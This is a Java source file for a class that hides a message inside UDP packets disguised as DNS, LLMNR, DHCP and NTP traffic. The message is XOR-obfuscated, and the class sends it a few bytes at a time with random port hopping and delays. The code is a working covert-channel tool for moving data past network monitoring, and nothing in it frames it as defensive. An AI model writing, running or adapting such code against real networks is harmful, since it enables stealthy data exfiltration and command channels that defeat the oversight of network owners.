package networking;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.stream.IntStream;

public class MultiserviceStealthUDPSocket {
    private List<Integer> availablePorts;
    Random rand;
    private DatagramSocket socket;
    private InetAddress address;
    @SuppressWarnings("unused")
	private String stealthPrefix = "";
    @SuppressWarnings("unused")
	private String stealthPostfix = "";
    
    char[] dnsBytes = {0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x06,0x77,0x61,0x74,0x73,0x6f,0x6e,0x09,0x74,0x65,0x6c,0x65,0x6d,0x65,0x74,0x72,0x79,0x09,0x6d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x03,0x63,0x6f,0x6d,0x00,0x00,0x01,0x00,0x01};
    char[] llmnrBytes = {0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x0f,0x44,0x45,0x53,0x4b,0x54,0x4f,0x50,0x2d,0x38,0x54,0x44,0x38,0x48,0x34,0x51,0x00,0x00,0xff,0x00,0x01};
    char[] dhcpPrefix = {0x01, 0x01, 0x06, 0x00};
    char[] dhcpPostfix = {0x00,0x00,0x80,0x00,0x0A,0x9E,0xA0,0x17,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x2E,0x57,0xE7,0x1D,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x63,0x82,0x53,0x63,0x35,0x01,0x08,0x3D,0x07,0x01,0x00,0x01,0x2E,0x57,0xE7,0x1D,0x0C,0x0A,0x6C,0x6F,0x63,0x61,0x6C,0x68,0x6F,0x73,0x74,0x78,0x3C,0x08,0x4D,0x53,0x46,0x54,0x20,0x35,0x2E,0x30,0x37,0x0D,0x01,0x0F,0x03,0x06,0x2C,0x2E,0x2F,0x1F,0x21,0x79,0xF9,0x2B,0xFC,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
    char[] ntpPrefix = {0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    char[] ntpPostfix = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    public MultiserviceStealthUDPSocket(String ip) throws SocketException, UnknownHostException {
    	rand = new Random();
        socket = new DatagramSocket();
        address = InetAddress.getByName(ip);
        availablePorts = new ArrayList<Integer>();
        availablePorts.add(53);
        availablePorts.add(5355);
        availablePorts.add(67);
        availablePorts.add(123);
    }
    private String[] port2CloakData(int port){
    	String[] temp = new String[2];
    	if(port==53){
    		temp[0]="";
    		temp[1]=new String(dnsBytes);
    	}else if(port == 5355){
    		temp[0]="";
    		temp[1]=new String(llmnrBytes);
    	}else if(port == 67){
    		temp[0]=new String(dhcpPrefix);
    		temp[1]=new String(dhcpPostfix);
    	}else if(port == 123) {
    		temp[0] = new String(ntpPrefix);
    		temp[1] = new String(ntpPostfix);
    	}
    	
    	else{
    		temp[0]="";
    		temp[1]="";
    	}
    	return temp;
    }
    private int port2BPP(int port){
    	if(port==53){
    		return 1;
    	}else if(port == 5355){
    		return 1;
    	}else if(port == 67){
    		return 3;
    	}else if(port == 123) {
    		return 3;
    	}
    	
    	else{
    		return -1;
    	}
    }
    public void sendHoppingStealthMessage(byte[] msg, long waitTimeMillis){
    	for(int i = 0; i < msg.length; i++){
    		msg[i]=(byte) (msg[i]^0x7f);
    	}
    	
    	int seqNum = 0;
    	int overallCount = 0;
    	System.out.println("[+] Sending Quiet Message");
    	int i = 0;
    	while(i<msg.length){
    		int randVal = rand.nextInt(availablePorts.size());
    		int port = availablePorts.get(randVal);
    		String[] cloakData = port2CloakData(port);
    		int bytesPerPacket = port2BPP(port);
    		
    		byte[] packetBuffer = new byte[cloakData[0].length()+bytesPerPacket+1+cloakData[1].length()];
    		for(int j = 0; j < cloakData[0].length(); j++){
    			packetBuffer[j]=(byte) cloakData[0].charAt(j);
    		}
    		for(int j = 0; j < cloakData[1].length(); j++){
    			packetBuffer[cloakData[0].length()+bytesPerPacket+1+j]=(byte) cloakData[1].charAt(j);
    		}
    		for(int j = cloakData[0].length(); j < cloakData[0].length()+bytesPerPacket; j++){
    			try{
    				overallCount++;
    				packetBuffer[j]=msg[i++];
    			}catch(Exception e){
    				System.out.println("[x] Overrun! Sending random data!");
    				packetBuffer[j]=(byte)rand.nextInt();
    				i++;
    			}
    			
    		}
    		packetBuffer[cloakData[0].length()+bytesPerPacket] = (byte) seqNum++;
    		DatagramPacket pack = new DatagramPacket(packetBuffer,packetBuffer.length, address,port);
    		try {
    			System.out.println("[>] Sending data to "+address+":"+port);
    			for(int k = 0; k < bytesPerPacket; k++){
    				System.out.println("[D]	"+packetBuffer[cloakData[0].length()+k]);
    			}
    			System.out.println("[#] "+(int)packetBuffer[cloakData[0].length()+bytesPerPacket]);
				socket.send(pack);
				Thread.sleep(waitTimeMillis);
			} catch (IOException | InterruptedException e) {
				e.printStackTrace();
			}
    		System.out.println("[%] "+(float)overallCount/(float)msg.length);
    	}
    }
    public void close() {
        socket.close();
    }
}